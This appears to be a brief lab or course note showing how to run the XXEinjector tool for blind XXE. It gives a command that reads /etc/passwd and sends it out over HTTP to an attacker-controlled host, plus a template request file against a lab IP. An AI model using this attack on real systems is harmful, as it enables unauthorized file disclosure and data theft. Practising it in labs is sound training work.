real usage:

```bash
ruby XXEinjector.rb --host=YOUR_IP --file=REQ_FILE --httpport=YOUR_PORT --path=/etc/passwd --oob=http --phpfilter
```

Example REQ_FILE

```xml
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.93.127
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.93.127
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
